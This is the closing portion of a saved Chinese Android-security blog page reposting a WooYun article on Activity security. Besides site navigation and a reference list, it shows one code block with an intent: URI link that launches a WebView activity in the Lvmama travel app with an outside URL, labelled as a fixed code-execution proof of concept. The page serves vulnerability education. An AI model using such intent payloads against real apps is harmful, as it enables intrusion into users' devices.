			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;a href="intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end"&gt; 15、驴妈妈代码执行（fixed） &lt;/a&gt;&lt;br&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716f1072323611-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716f1072323611-1"><span class="crayon-o">&lt;</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">href</span><span class="crayon-o">=</span><span class="crayon-s">"intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end"</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">15</span>、驴妈妈代码执行（<span class="crayon-i">fixed</span>）<span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">a</span><span class="crayon-o">&gt;</span><span class="crayon-e ">&lt;br&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171051lvmm.jpg" alt=""></p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/2014111703585555826.jpg" alt=""></p>
<h2>0x06 参考</h2>
<hr>
<p><a href="http://www.jssec.org/dl/android_securecoding_en.pdf">http://www.jssec.org/dl/android_securecoding_en.pdf</a></p>
<p>转载自：<a href="http://drops.wooyun.org/tips/3812">乌云知识库</a>&nbsp;作者：<a title="由 瘦蛟舞 发布" href="http://drops.wooyun.org/author/%E7%98%A6%E8%9B%9F%E8%88%9E" rel="author">瘦蛟舞</a>&nbsp; &nbsp; 感谢原文作者授权转载</p>
<p>&nbsp;</p>
<p class="tags"><i class="fa fa-tag"></i> <a href="http://www.droidsec.cn/tag/activity/" rel="tag">Activity</a> <a href="http://www.droidsec.cn/tag/uxss/" rel="tag">UXSS</a></p>

<div class="date">
  <span class="day">11</span>
  <span class="month">2015-02</span>
</div>
</article>
<p>&nbsp;</p>
	</div><div class="col-lg-3" id="side"><aside class="uazoh7-widget"><h3 style="margin-top: 0px;">文章分类</h3>		<div class="uazoh7-category-widget"><div class="uazoh7-widget-inner"><ul>
<li><p><a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" title="APP漏洞挖掘"><i class="fa fa-folder-open"></i>APP漏洞挖掘</a> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/"><i class="fa fa-rss"></i></a> <span>25</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/androidsecuritybook/" title="安卓安全书籍"><i class="fa fa-folder-open"></i>安卓安全书籍</a> <a href="http://www.droidsec.cn/category/androidsecuritybook/"><i class="fa fa-rss"></i></a> <span>8</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/" title="安卓安全工具"><i class="fa fa-folder-open"></i>安卓安全工具</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/"><i class="fa fa-rss"></i></a> <span>11</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/" title="安卓漏洞攻防"><i class="fa fa-folder-open"></i>安卓漏洞攻防</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/"><i class="fa fa-rss"></i></a> <span>16</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/" title="安卓逆向分析"><i class="fa fa-folder-open"></i>安卓逆向分析</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/"><i class="fa fa-rss"></i></a> <span class="">9</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/" title="移动安全资讯"><i class="fa fa-folder-open"></i>移动安全资讯</a> <a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li>		</ul></div></div>
</aside><aside class="uazoh7-widget"><h3>友情链接</h3>
	<ul class="xoxo blogroll">
<li><a href="http://security.tencent.com/" target="_blank">腾讯TSRC</a></li>
<li><a href="http://www.ijiandao.com/" target="_blank">爱尖刀</a></li>
<li><a href="http://xteam.baidu.com/" target="_blank">Baidu x-team</a></li>
<li><a href="http://blogs.360.cn/360mobile/" target="_blank">360移动安全</a></li>
<li><a href="http://navisec.it/" target="_blank">navisec安全导航</a></li>
<li><a href="http://www.nxadmin.com/">Nxadmin</a></li>
<li><a href="http://www.secpulse.com/" target="_blank">安全脉博</a></li>
<li><a href="http://www.monstersb.net/" target="_blank">Monster</a></li>
<li><a href="http://jaq.alibaba.com/blog.htm" target="_blank">阿里聚安全</a></li>
<li><a href="http://www.freebuf.com/" target="_blank">FreeBuf</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">乌云漏洞平台</a></li>
<li><a href="http://wiki.secmobi.com/home" target="_blank">SecMobi Wiki</a></li>
<li><a href="http://securityintelligence.com/" target="_blank">SecurityIntelligence</a></li>
<li><a href="http://androidxref.com/" target="_blank">AndroidXRef</a></li>
<li><a href="http://www.androiddevtools.cn/" target="_blank">AndroidDevTools</a></li>

	</ul>
</aside>
</div></div></div></section>
<div id="comments" style="display:none"><a name="respond"></a></div>
<div id="denglu_tuijian"></div><div id="denglu_comment"><iframe name="easyXDM_default3171_provider" id="easyXDM_default3171_provider" frameborder="0" src="Android Activtity Security _ DroidSec.cn_files/commentMiddle.html" style="width: 100%; height: 229px;"></iframe></div>

</div><!--uazoh7-content-->
<footer class="uazoh7-footer">
      <div class="container">
        <div class="row">
		<div class="col-lg-2 col-md-2">
            <div class="uazoh7-widget uazoh7-links-widget">
              <h3>links</h3>
              <div class="uazoh7-widget-inner">
                <ul id="footer_top_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
</ul>              </div>
            </div>
          </div>

          <div class="col-lg-4 col-md-4">
            <div class="uazoh7-widget uazoh7-links-widget uazoh7-about-widget">
              <h3>随机 <strong>文章</strong></h3>
              <div class="uazoh7-widget-inner">
   <ul>
<li><a href="http://www.droidsec.cn/webview-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/" rel="bookmark" title="WebView 远程代码执行漏洞浅析">WebView 远程代码执行漏洞浅析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/cve-2014-7911%e5%ae%89%e5%8d%93%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" rel="bookmark" title="cve-2014-7911安卓提权漏洞分析">cve-2014-7911安卓提权漏洞分析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android%e5%b9%b3%e5%8f%b0%e7%9a%84sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/" rel="bookmark" title="一条短信控制你的手机! Android平台的SQL注入漏洞浅析">一条短信控制你的手机! Android平台的SQL注入漏洞浅析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e8%87%aa%e5%b7%b1%e5%8a%a8%e6%89%8b%e5%bc%80%e5%8f%91drozer%e6%8f%92%e4%bb%b6%e4%b9%8b%e8%bf%9b%e9%98%b6%e7%af%87/" rel="bookmark" title="自己动手开发Drozer插件之进阶篇">自己动手开发Drozer插件之进阶篇</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-service-security/" rel="bookmark" title="Android Service Security">Android Service Security</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/google%e5%ae%98%e6%96%b9%e5%87%ba%e5%93%81%e7%9a%84android-app%e5%8f%8d%e7%bc%96%e7%bb%8e%e5%b7%a5%e5%85%b7-enjarify/" rel="bookmark" title="Google官方出品的Android App反编绎工具-enjarify">Google官方出品的Android App反编绎工具-enjarify</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%88%a9%e7%94%a8mono-for-android%e5%bc%80%e5%8f%91%e7%9a%84%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6/" rel="bookmark" title="利用Mono for Android开发的恶意软件">利用Mono for Android开发的恶意软件</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/" rel="bookmark" title="Android APP安全测试入门">Android APP安全测试入门</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android%e5%af%86%e7%a0%81%e5%ad%a6%e7%9b%b8%e5%85%b3-%e6%a1%88%e4%be%8bwifi%e4%b8%87%e8%83%bd%e9%92%a5%e5%8c%99/" rel="bookmark" title="Android密码学相关-案例wifi万能钥匙">Android密码学相关-案例wifi万能钥匙</a></li>
</ul>
            </div>
          </div></div>

          <div class="col-lg-3 col-md-3">
            <div class="uazoh7-widget uazoh7-tags-widget">
              <h3>文章 <strong>Tags</strong></h3>
              <div class="uazoh7-widget-inner">
                <a href="http://www.droidsec.cn/tag/pin/" class="tag-link-47" title="1个话题" style="font-size: 13pt;">PIN</a>
<a href="http://www.droidsec.cn/tag/tsrc/" class="tag-link-48" title="1个话题" style="font-size: 13pt;">TSRC</a>
<a href="http://www.droidsec.cn/tag/ui/" class="tag-link-42" title="1个话题" style="font-size: 13pt;">UI</a>
<a href="http://www.droidsec.cn/tag/activity/" class="tag-link-36" title="1个话题" style="font-size: 13pt;">Activity</a>
<a href="http://www.droidsec.cn/tag/mobile-forensics/" class="tag-link-32" title="1个话题" style="font-size: 13pt;">Mobile Forensics</a>
<a href="http://www.droidsec.cn/tag/santoku-linux/" class="tag-link-33" title="1个话题" style="font-size: 13pt;">Santoku Linux</a>
<a href="http://www.droidsec.cn/tag/url/" class="tag-link-49" title="1个话题" style="font-size: 13pt;">URL</a>
<a href="http://www.droidsec.cn/tag/sd/" class="tag-link-50" title="1个话题" style="font-size: 13pt;">SD</a>
<a href="http://www.droidsec.cn/tag/debug/" class="tag-link-62" title="1个话题" style="font-size: 13pt;">DEBUG</a>
<a href="http://www.droidsec.cn/tag/google-android/" class="tag-link-71" title="1个话题" style="font-size: 13pt;">Google Android</a>
<a href="http://www.droidsec.cn/tag/verbose/" class="tag-link-61" title="1个话题" style="font-size: 13pt;">VERBOSE</a>
<a href="http://www.droidsec.cn/tag/android-override/" class="tag-link-57" title="1个话题" style="font-size: 13pt;">Android Override</a>
<a href="http://www.droidsec.cn/tag/http/" class="tag-link-51" title="1个话题" style="font-size: 13pt;">HTTP</a>
<a href="http://www.droidsec.cn/tag/mitm/" class="tag-link-52" title="1个话题" style="font-size: 13pt;">MITM</a>
<a href="http://www.droidsec.cn/tag/adb/" class="tag-link-24" title="1个话题" style="font-size: 13pt;">ADB</a>
<a href="http://www.droidsec.cn/tag/root/" class="tag-link-22" title="1个话题" style="font-size: 13pt;">ROOT</a>
<a href="http://www.droidsec.cn/tag/android-shared-preferences/" class="tag-link-18" title="1个话题" style="font-size: 13pt;">Android Shared Preferences</a>
<a href="http://www.droidsec.cn/tag/android-internal-storage/" class="tag-link-19" title="1个话题" style="font-size: 13pt;">Android Internal Storage</a>
<a href="http://www.droidsec.cn/tag/android-backup/" class="tag-link-21" title="1个话题" style="font-size: 13pt;">Android Backup</a>
<a href="http://www.droidsec.cn/tag/gui/" class="tag-link-35" title="2个话题" style="font-size: 13pt;">GUI</a>
<a href="http://www.droidsec.cn/tag/android-system/" class="tag-link-12" title="2个话题" style="font-size: 13pt;">Android System</a>
<a href="http://www.droidsec.cn/tag/uri/" class="tag-link-46" title="2个话题" style="font-size: 13pt;">URI</a>
<a href="http://www.droidsec.cn/tag/uc/" class="tag-link-53" title="2个话题" style="font-size: 13pt;">UC</a>
<a href="http://www.droidsec.cn/tag/gid/" class="tag-link-89" title="2个话题" style="font-size: 13pt;">GID</a>
<a href="http://www.droidsec.cn/tag/uxss/" class="tag-link-74" title="2个话题" style="font-size: 13pt;">UXSS</a>
<a href="http://www.droidsec.cn/tag/apk/" class="tag-link-15" title="3个话题" style="font-size: 13pt;">APK</a>
<a href="http://www.droidsec.cn/tag/jeb/" class="tag-link-44" title="3个话题" style="font-size: 13pt;">JEB</a>
<a href="http://www.droidsec.cn/tag/drozer/" class="tag-link-76" title="3个话题" style="font-size: 13pt;">Drozer</a>
<a href="http://www.droidsec.cn/tag/api/" class="tag-link-59" title="3个话题" style="font-size: 13pt;">API</a>
<a href="http://www.droidsec.cn/tag/poc/" class="tag-link-16" title="4个话题" style="font-size: 13pt;">POC</a>              </div>
            </div>
          </div>

          <div class="col-lg-3 col-md-3">
            <div class="uazoh7-widget uazoh7-about-widget">
              <h3>关注 | 联系</h3>
              <div class="uazoh7-widget-inner">                  <img src="Android Activtity Security _ DroidSec.cn_files/3d563857728b88c4f666a9d9adb4c2ed_qrcode.png" alt="DroidSec.cn qr-code">				  <p class="contacts" style="border-top-width: 1px; margin-top: 30px;"><i class="fa fa-envelope"></i> DroidSec#QQ.com</p>              </div>
            </div>
          </div>

          <div class="col-lg-12">
            <div class="uazoh7-widget uazoh7-copyright-widget">
              <div class="uazoh7-widget-inner">
                <p>© Copyright 2015 by DroidSec.cn. All Rights Reserved.</p>
                <p><a href="http://weibo.com/androidsec">更多安卓安全资讯请关注本站微博</a> </p>
              </div>
            </div>
          </div>        </div>
      </div>
</footer>








<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button type="button" id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div>

 </body></html>